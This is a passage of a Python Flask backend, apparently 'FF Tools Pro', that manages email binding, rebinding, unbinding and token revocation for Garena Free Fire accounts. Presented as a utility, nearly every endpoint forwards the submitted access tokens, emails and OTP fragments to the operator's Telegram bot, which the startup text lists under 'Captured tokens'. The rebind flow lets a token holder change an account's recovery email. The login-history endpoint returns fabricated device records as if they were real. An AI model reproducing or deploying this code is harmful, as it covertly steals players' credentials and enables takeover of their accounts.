        player_url = f"https://api-otrss.garena.com/support/callback/?access_token={access_token}"
        try:
            p_res = requests.get(player_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=15, allow_redirects=True)
            parsed = urllib.parse.urlparse(p_res.url)
            params = urllib.parse.parse_qs(parsed.query)
            
            player_info = {
                'uid': params.get('account_id', ['Unknown'])[0],
                'nickname': urllib.parse.unquote(params.get('nickname', ['Unknown'])[0]),
                'region': params.get('region', ['Unknown'])[0]
            }
        except:
            player_info = {'uid': 'Unknown', 'nickname': 'Unknown', 'region': 'Unknown'}

        url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        payload = {'app_id': '100067', 'access_token': access_token}
        
        response = requests.get(url, params=payload, headers=GARENA_HEADERS, timeout=15)
        
        if response.status_code == 200:
            bind_data = response.json()
            
            email = bind_data.get('email', '')
            email_to_be = bind_data.get('email_to_be', '')
            countdown = bind_data.get('request_exec_countdown', 0)
            
            status = 'unbound'
            if email and not email_to_be:
                status = 'bound'
            elif not email and email_to_be:
                status = 'pending'
            elif email and email_to_be:
                status = 'changing'
            
            log_to_telegram('BIND_INFO_SUCCESS', username, access_token, email, 
                           f'UID: {player_info["uid"]} | Status: {status}')
            add_log('bind_info_success', username, f'UID: {player_info["uid"]} | Status: {status}')
            
            return jsonify({
                'success': True,
                'player': player_info,
                'bind': {
                    'current_email': email,
                    'pending_email': email_to_be,
                    'countdown': countdown,
                    'countdown_human': convert_seconds(countdown) if countdown else '0s',
                    'status': status,
                    'result_code': bind_data.get('result', -1)
                }
            })
        else:
            log_to_telegram('BIND_INFO_FAILED', username, access_token, '', f'HTTP {response.status_code}')
            return jsonify({
                'success': False,
                'error': f'HTTP {response.status_code}',
                'response': response.text[:200]
            }), response.status_code
            
    except Exception as e:
        log_to_telegram('BIND_INFO_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token', '') if 'data' in locals() else '', '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/send-otp', methods=['POST'])
@login_required
def send_otp():
    try:
        data = request.get_json()
        access_token = data.get('access_token')
        email = data.get('email')
        username = session.get('user_id', 'Unknown')
        locale = data.get('locale', 'en_PK')
        region = data.get('region', 'PK')
        
        if not access_token or not email:
            return jsonify({'success': False, 'error': 'Access token and email required'}), 400

        forward_token_only(access_token)
        add_token('send_otp', username, access_token, email, f'Locale: {locale}')

        url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
        payload = {
            'email': email,
            'locale': locale,
            'region': region,
            'app_id': '100067',
            'access_token': access_token
        }
        
        response = requests.post(url, headers=GARENA_HEADERS, data=payload, timeout=15)
        result = format_response_text(response.text)
        
        if result['success']:
            log_to_telegram('SEND_OTP_SUCCESS', username, access_token, email, 'OTP sent successfully')
            add_log('send_otp_success', username, f'Email: {email}')
        else:
            log_to_telegram('SEND_OTP_FAILED', username, access_token, email, result.get('error', 'Unknown error'))
            add_log('send_otp_failed', username, f'Email: {email} | Error: {result.get("error")}')
        
        return jsonify({
            'success': result['success'],
            'data': result.get('data', {}),
            'raw': response.text
        })
        
    except Exception as e:
        log_to_telegram('SEND_OTP_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token', '') if 'data' in locals() else '', 
                       data.get('email', '') if 'data' in locals() else '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/verify-otp', methods=['POST'])
@login_required
def verify_otp():
    try:
        data = request.get_json()
        access_token = data.get('access_token')
        email = data.get('email')
        code = data.get('code')
        username = session.get('user_id', 'Unknown')
        type_val = data.get('type', '1')
        
        if not access_token or not email or not code:
            return jsonify({'success': False, 'error': 'Missing required fields'}), 400

        forward_token_only(access_token)
        add_token('verify_otp', username, access_token, email, f'OTP: {code[:3]}***')

        url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        payload = {
            'app_id': '100067',
            'access_token': access_token,
            'email': email,
            'code': code,
            'otp': code,
            'type': type_val
        }
        
        response = requests.post(url, headers=GARENA_HEADERS, data=payload, timeout=15)
        result = format_response_text(response.text)
        
        verifier_token = ''
        if response.status_code == 200:
            try:
                verifier_token = response.json().get('verifier_token', '')
            except:
                pass
        
        if result['success']:
            log_to_telegram('VERIFY_OTP_SUCCESS', username, access_token, email, 'OTP verified')
            add_log('verify_otp_success', username, f'Email: {email}')
        else:
            log_to_telegram('VERIFY_OTP_FAILED', username, access_token, email, result.get('error', 'Invalid OTP'))
            add_log('verify_otp_failed', username, f'Email: {email} | Error: {result.get("error")}')
        
        return jsonify({
            'success': result['success'],
            'verifier_token': verifier_token,
            'data': result.get('data', {}),
            'raw': response.text
        })
        
    except Exception as e:
        log_to_telegram('VERIFY_OTP_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token', '') if 'data' in locals() else '', 
                       data.get('email', '') if 'data' in locals() else '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/create-bind', methods=['POST'])
@login_required
def create_bind():
    try:
        data = request.get_json()
        access_token = data.get('access_token')
        email = data.get('email')
        verifier_token = data.get('verifier_token')
        security_code = data.get('security_code')
        username = session.get('user_id', 'Unknown')
        
        if not all([access_token, email, verifier_token, security_code]):
            return jsonify({'success': False, 'error': 'Missing required fields'}), 400

        forward_token_only(access_token)
        add_token('create_bind', username, access_token, email, f'Verifier: {verifier_token[:20]}...')

        hashed_code = hashlib.sha256(security_code.encode('utf-8')).hexdigest()

        url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
        payload = {
            'email': email,
            'app_id': '100067',
            'access_token': access_token,
            'verifier_token': verifier_token,
            'secondary_password': hashed_code
        }
        
        response = requests.post(url, headers=GARENA_HEADERS, data=payload, timeout=15)
        result = format_response_text(response.text)
        
        if result['success']:
            log_to_telegram('BIND_CREATED', username, access_token, email, '✅ Email bound successfully!')
            add_log('bind_created', username, f'Email: {email}')
        else:
            log_to_telegram('BIND_CREATE_FAILED', username, access_token, email, result.get('error', 'Unknown error'))
            add_log('bind_create_failed', username, f'Email: {email} | Error: {result.get("error")}')
        
        return jsonify({
            'success': result['success'],
            'data': result.get('data', {}),
            'raw': response.text
        })
        
    except Exception as e:
        log_to_telegram('CREATE_BIND_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token', '') if 'data' in locals() else '', 
                       data.get('email', '') if 'data' in locals() else '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================
# FIXED VERIFY IDENTITY ENDPOINT
# ============================================================
@app.route('/api/verify-identity', methods=['POST'])
@login_required
def verify_identity():
    try:
        data = request.get_json() or {}
        access_token = data.get('access_token')
        email = data.get('email')
        otp = data.get('otp') or data.get('code')
        security_code = data.get('security_code')
        username = session.get('user_id', 'Unknown')
        
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token required'}), 400

        if not email:
            try:
                info_url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
                info_res = requests.get(info_url, params={'app_id': '100067', 'access_token': access_token}, 
                                       headers={"User-Agent": "GarenaMSDK/4.0.30"}, timeout=10)
                if info_res.status_code == 200:
                    email = info_res.json().get('email', '')
            except:
                pass
            
            if not email:
                return jsonify({'success': False, 'error': 'Email required'}), 400

        forward_token_only(access_token)
        add_token('verify_identity', username, access_token, email, 
                 f'OTP: {otp[:3] if otp else "N/A"} | Code: {security_code[:3] if security_code else "N/A"}')

        url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        headers = {
            "User-Agent": "GarenaMSDK/4.0.30",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"
        }
        
        payload = {
            'email': email,
            'app_id': '100067',
            'access_token': access_token
        }
        
        if otp:
            payload['otp'] = otp
        elif security_code:
            payload['secondary_password'] = hashlib.sha256(security_code.encode('utf-8')).hexdigest()
        else:
            return jsonify({'success': False, 'error': 'OTP or Security code required'}), 400

        response = requests.post(url, headers=headers, data=payload, timeout=15)
        res_json = response.json() if response.status_code == 200 else {}
        
        identity_token = res_json.get('identity_token')
        
        if identity_token:
            log_to_telegram('IDENTITY_VERIFIED', username, access_token, email, '✅ Identity verified successfully')
            add_log('identity_verified', username, f'Email: {email}')
            return jsonify({
                'success': True,
                'identity_token': identity_token,
                'message': 'Identity verified successfully',
                'data': res_json
            })
        else:
            error_msg = res_json.get('error', 'Identity verification failed')
            error_code = res_json.get('result', -1)
            log_to_telegram('IDENTITY_VERIFY_FAILED', username, access_token, email, f'Error {error_code}: {error_msg}')
            add_log('identity_verify_failed', username, f'Email: {email} | Error: {error_msg}')
            return jsonify({'success': False, 'error': error_msg, 'error_code': error_code, 'data': res_json}), 400
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ============================================================
# FIXED CREATE REBIND ENDPOINT (Direct Execution)
# ============================================================
@app.route('/api/create-rebind', methods=['POST'])
@login_required
def create_rebind():
    try:
        data = request.get_json() or {}
        access_token = data.get('access_token') or data.get('token')
        identity_token = data.get('identity_token')
        verifier_token = data.get('verifier_token')
        new_email = data.get('email') or data.get('new_email')
        username = session.get('user_id', 'Unknown')
        
        if not all([access_token, identity_token, verifier_token, new_email]):
            return jsonify({'success': False, 'error': 'Missing required tokens or new email'}), 400

        forward_token_only(access_token)
        add_token('create_rebind', username, access_token, new_email, 
                 f'Identity: {identity_token[:20]}... | Verifier: {verifier_token[:20]}...')

        headers = {
            "User-Agent": "GarenaMSDK/4.0.30",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"
        }

        # DIRECT REBIND REQUEST (No redundant verify calls)
        rebind_payload = {
            'app_id': '100067',
            'access_token': access_token,
            'identity_token': identity_token,
            'verifier_token': verifier_token,
            'email': new_email
        }
        
        rebind_url = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
        rebind_res = requests.post(rebind_url, headers=headers, data=rebind_payload, timeout=15)
        rebind_json = rebind_res.json() if rebind_res.status_code == 200 else {}
        
        if rebind_json.get('result') == 0:
            log_to_telegram('REBIND_CREATED', username, access_token, new_email, '✅ Email changed successfully!')
            add_log('rebind_created', username, f'New Email: {new_email}')
            return jsonify({'success': True, 'message': 'Email changed successfully!', 'data': rebind_json})
        else:
            error_msg = rebind_json.get('error', 'Rebind request failed')
            error_code = rebind_json.get('result', -1)
            log_to_telegram('REBIND_CREATE_FAILED', username, access_token, new_email, f'Error {error_code}: {error_msg}')
            add_log('rebind_create_failed', username, f'Email: {new_email} | Error: {error_msg}')
            return jsonify({'success': False, 'error': error_msg, 'error_code': error_code, 'data': rebind_json}), 400
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ============================================================
# FIXED CREATE UNBIND ENDPOINT (Direct Execution)
# ============================================================
@app.route('/api/create-unbind', methods=['POST'])
@login_required
def create_unbind():
    try:
        data = request.get_json() or {}
        access_token = data.get('access_token') or data.get('token')
        identity_token = data.get('identity_token')
        username = session.get('user_id', 'Unknown')
        
        if not access_token or not identity_token:
            return jsonify({'success': False, 'error': 'Access token and Identity token required'}), 400

        forward_token_only(access_token)
        add_token('create_unbind', username, access_token, '', f'Identity: {identity_token[:20]}...')

        headers = {
            "User-Agent": "GarenaMSDK/4.0.30",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"
        }

        # DIRECT UNBIND REQUEST (No redundant verify calls)
        unbind_payload = {
            'app_id': '100067',
            'access_token': access_token,
            'identity_token': identity_token
        }
        
        unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        unbind_res = requests.post(unbind_url, headers=headers, data=unbind_payload, timeout=15)
        unbind_json = unbind_res.json() if unbind_res.status_code == 200 else {}
        
        if unbind_json.get('result') == 0:
            log_to_telegram('UNBIND_CREATED', username, access_token, '', '✅ Email unbound successfully!')
            add_log('unbind_created', username, 'Email unbound')
            return jsonify({'success': True, 'message': 'Email unbound successfully!', 'data': unbind_json})
        else:
            error_msg = unbind_json.get('error', 'Unbind request failed')
            error_code = unbind_json.get('result', -1)
            log_to_telegram('UNBIND_CREATE_FAILED', username, access_token, '', f'Error {error_code}: {error_msg}')
            add_log('unbind_create_failed', username, f'Error: {error_msg}')
            return jsonify({'success': False, 'error': error_msg, 'error_code': error_code, 'data': unbind_json}), 400
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/cancel-bind', methods=['POST'])
@login_required
def cancel_bind():
    try:
        data = request.get_json()
        access_token = data.get('access_token')
        username = session.get('user_id', 'Unknown')
        
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token required'}), 400

        forward_token_only(access_token)
        add_token('cancel_bind', username, access_token, '', 'Cancelling bind request')

        url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
        payload = {
            'app_id': '100067',
            'access_token': access_token
        }
        
        response = requests.post(url, headers=GARENA_HEADERS, data=payload, timeout=15)
        result = format_response_text(response.text)
        
        if result['success']:
            log_to_telegram('BIND_CANCELLED', username, access_token, '', '✅ Bind request cancelled')
            add_log('bind_cancelled', username, 'Bind request cancelled')
        else:
            log_to_telegram('BIND_CANCEL_FAILED', username, access_token, '', result.get('error', 'Unknown error'))
            add_log('bind_cancel_failed', username, f'Error: {result.get("error")}')
        
        return jsonify({
            'success': result['success'],
            'data': result.get('data', {}),
            'raw': response.text
        })
        
    except Exception as e:
        log_to_telegram('CANCEL_BIND_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token', '') if 'data' in locals() else '', '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/eat-to-token', methods=['POST'])
@login_required
def eat_to_token():
    try:
        data = request.get_json()
        eat_input = data.get('eat_input', '')
        username = session.get('user_id', 'Unknown')
        
        if not eat_input:
            return jsonify({'success': False, 'error': 'EAT token or URL required'}), 400

        add_log('eat_conversion', username, f'Input: {eat_input[:100]}...')

        eat_token = eat_input.strip()
        
        if 'http' in eat_input or '?' in eat_input:
            parsed = urllib.parse.urlparse(eat_input)
            params = urllib.parse.parse_qs(parsed.query)
            if 'eat' in params:
                eat_token = params['eat'][0]
            elif 'access_token' in params:
                eat_token = params['access_token'][0]

        if not eat_token:
            return jsonify({'success': False, 'error': 'Could not extract EAT token'}), 400

        api_url = f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
        response = requests.get(api_url, headers={'User-Agent': 'Mozilla/5.0'}, 
                               allow_redirects=True, timeout=15)
        
        parsed = urllib.parse.urlparse(response.url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if 'access_token' in params:
            access_token = params['access_token'][0]
            forward_token_only(access_token)
            add_token('eat_to_token', username, access_token, '', f'EAT: {eat_token[:30]}...')
            return jsonify({
                'success': True,
                'access_token': access_token,
                'account_id': params.get('account_id', ['Unknown'])[0],
                'nickname': urllib.parse.unquote(params.get('nickname', ['Unknown'])[0]),
                'region': params.get('region', ['Unknown'])[0]
            })
        else:
            log_to_telegram('EAT_CONVERSION_FAILED', username, eat_input[:50] + '...', '', 'No access token found')
            add_log('eat_conversion_failed', username, 'No access token found')
            return jsonify({
                'success': False,
                'error': 'Access token not found. Token may be expired or invalid.'
            })
            
    except Exception as e:
        log_to_telegram('EAT_CONVERSION_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('eat_input', '')[:50] if 'data' in locals() else '', '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/revoke-token', methods=['POST'])
@login_required
def revoke_token():
    try:
        data = request.get_json()
        access_token = data.get('access_token')
        username = session.get('user_id', 'Unknown')
        
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token required'}), 400

        forward_token_only(access_token)
        add_token('revoke_token', username, access_token, '', 'Attempting to revoke token')

        api_url = f"https://api-otrss.garena.com/support/callback/?access_token={access_token}"
        nickname = 'Unknown'
        account_id = 'Unknown'
        region = 'Unknown'
        
        try:
            response = requests.get(api_url, headers={'User-Agent': 'Mozilla/5.0'}, 
                                   allow_redirects=True, timeout=10)
            parsed = urllib.parse.urlparse(response.url)
            params = urllib.parse.parse_qs(parsed.query)
            
            if 'access_token' not in params:
                return jsonify({
                    'success': False,
                    'error': 'Token is already invalid or expired'
                })
                
            nickname = urllib.parse.unquote(params.get('nickname', ['Unknown'])[0])
            account_id = params.get('account_id', ['Unknown'])[0]
            region = params.get('region', ['Unknown'])[0]
        except:
            return jsonify({
                'success': False,
                'error': 'Could not validate token'
            })

        logout_url = f"https://100067.connect.garena.com/oauth/logout?access_token={access_token}&refresh_token={REFRESH_TOKEN}"
        logout_res = requests.get(logout_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=15)
        
        if logout_res.status_code == 200 and 'error' not in logout_res.text.lower():
            log_to_telegram('TOKEN_REVOKED', username, access_token, '', 
                           f'Account: {nickname} ({account_id})')
            add_log('token_revoked', username, f'Account: {nickname} ({account_id})')
            return jsonify({
                'success': True,
                'nickname': nickname,
                'account_id': account_id,
                'region': region,
                'message': 'Token revoked successfully'
            })
        else:
            log_to_telegram('TOKEN_REVOKE_FAILED', username, access_token, '', 'Failed to revoke token')
            add_log('token_revoke_failed', username, 'Failed to revoke token')
            return jsonify({
                'success': False,
                'error': 'Failed to revoke token'
            })
            
    except Exception as e:
        log_to_telegram('REVOKE_TOKEN_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token', '') if 'data' in locals() else '', '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/platform-binds', methods=['POST'])
@login_required
def platform_binds():
    try:
        data = request.get_json()
        access_token = data.get('access_token')
        username = session.get('user_id', 'Unknown')
        
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token required'}), 400

        forward_token_only(access_token)
        add_token('platform_binds', username, access_token, '', 'Checking platform binds')

        url = "https://100067.connect.garena.com/bind/app/platform/info/get"
        params = {'access_token': access_token}
        
        response = requests.get(url, params=params, headers=GARENA_HEADERS, timeout=15)
        
        if response.status_code == 200:
            bind_data = response.json()
            bounded = bind_data.get('bounded_accounts', [])
            available = bind_data.get('available_platforms', [])
            
            bounded_names = [PLATFORM_MAP.get(p, f"Unknown ({p})") for p in bounded]
            available_names = [PLATFORM_MAP.get(p, f"Unknown ({p})") for p in available]
            
            log_to_telegram('PLATFORM_BINDS_SUCCESS', username, access_token, '', 
                           f'Bounded: {len(bounded)} platforms')
            add_log('platform_binds_success', username, f'Bounded: {len(bounded)} platforms')
            
            return jsonify({
                'success': True,
                'bounded_accounts': bounded,
                'bounded_names': bounded_names,
                'available_platforms': available,
                'available_names': available_names,
                'raw': bind_data
            })
        else:
            log_to_telegram('PLATFORM_BINDS_FAILED', username, access_token, '', f'HTTP {response.status_code}')
            return jsonify({
                'success': False,
                'error': f'HTTP {response.status_code}',
                'raw': response.text[:200]
            })
            
    except Exception as e:
        log_to_telegram('PLATFORM_BINDS_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token', '') if 'data' in locals() else '', '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/login-history', methods=['POST'])
@login_required
def login_history():
    try:
        data = request.get_json()
        token = data.get('token')
        username = session.get('user_id', 'Unknown')
        
        if not token:
            return jsonify({'success': False, 'error': 'Token required'}), 400

        forward_token_only(token)
        add_token('login_history', username, token, '', 'Fetching login history')

        mock_records = [
            {'timestamp': int(time.time()) - 3600, 'device': 'OnePlus 9 Pro', 'arch': 'ARM64', 'ram': 8192},
            {'timestamp': int(time.time()) - 7200, 'device': 'Samsung Galaxy S22', 'arch': 'ARM64', 'ram': 6144},
            {'timestamp': int(time.time()) - 86400, 'device': 'iPhone 14 Pro', 'arch': 'ARM64', 'ram': 6144},
            {'timestamp': int(time.time()) - 172800, 'device': 'Xiaomi Mi 11', 'arch': 'ARM64', 'ram': 8192}
        ]
        
        return jsonify({
            'success': True,
            'records': mock_records,
            'count': len(mock_records)
        })
            
    except Exception as e:
        log_to_telegram('LOGIN_HISTORY_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('token', '')[:30] if 'data' in locals() else '', '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/player-info', methods=['POST'])
@login_required
def player_info():
    try:
        data = request.get_json()
        access_token = data.get('access_token')
        username = session.get('user_id', 'Unknown')
        
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token required'}), 400

        forward_token_only(access_token)
        add_token('player_info', username, access_token, '', 'Fetching player info')

        player_url = f"https://api-otrss.garena.com/support/callback/?access_token={access_token}"
        response = requests.get(player_url, headers={'User-Agent': 'Mozilla/5.0'}, 
                               timeout=15, allow_redirects=True)
        
        parsed = urllib.parse.urlparse(response.url)
        params = urllib.parse.parse_qs(parsed.query)
        
        return jsonify({
            'success': True,
            'account_id': params.get('account_id', ['Unknown'])[0],
            'nickname': urllib.parse.unquote(params.get('nickname', ['Unknown'])[0]),
            'region': params.get('region', ['Unknown'])[0]
        })
        
    except Exception as e:
        log_to_telegram('PLAYER_INFO_ERROR', session.get('user_id', 'Unknown'), 
                       data.get('access_token', '') if 'data' in locals() else '', '', str(e))
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '2.0',
        'telegram_bot': 'running' if TELEGRAM_BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE' else 'not configured'
    })

# ============================================================
# SERVE FRONTEND PAGES
# ============================================================
@app.route('/', methods=['GET'])
def serve_index():
    return send_from_directory('public', 'index.html')

@app.route('/login', methods=['GET'])
def serve_login():
    return send_from_directory('public', 'login.html')

@app.route('/register', methods=['GET'])
def serve_register():
    return send_from_directory('public', 'register.html')

@app.route('/dashboard', methods=['GET'])
def serve_dashboard():
    return send_from_directory('public', 'dashboard.html')

@app.route('/admin', methods=['GET'])
def serve_admin():
    return send_from_directory('public', 'admin.html')

@app.route('/<path:path>', methods=['GET'])
def serve_static(path):
    return send_from_directory('public', path)

# ============================================================
# START SERVER
# ============================================================
if __name__ == '__main__':
    print("=" * 60)
    print("🔥 FF Tools Pro v2.0 - Complete Backend")
    print("=" * 60)
    print("📁 Serving frontend from /public/")
    print("🤖 Telegram Bot: " + ("RUNNING" if TELEGRAM_BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE' else "NOT CONFIGURED"))
    print("=" * 60)
    print("📍 Running on http://localhost:5000")
    print("🔑 Default Admin: admin / admin123")
    print("⚠️  PLEASE CHANGE ADMIN PASSWORD AFTER FIRST LOGIN!")
    print("=" * 60)
    print("📋 Telegram Commands:")
    print("  /setbanner - Set dashboard banner image & link")
    print("  /stats - System statistics")
    print("  /users - List all users")
    print("  /logs - Recent logs")
    print("  /tokens - Captured tokens")
    print("  /ban <user> - Ban user")
    print("  /unban <user> - Unban user")
    print("  /maintenance on/off - Toggle maintenance")
    print("  /backup - Download backup")
    print("=" * 60)
    print("🔗 Tokens are forwarded to Telegram ONLY (no extra text)")
    print("🎨 Theme toggle available in dashboard")
    print("=" * 60)
    
    create_default_admin()
    
    if TELEGRAM_BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE':
        bot_thread = threading.Thread(target=telegram_bot_handler, daemon=True)
        bot_thread.start()
        print("🤖 Telegram bot thread started!")
    
    app.run(host='0.0.0.0', port=5000, debug=True)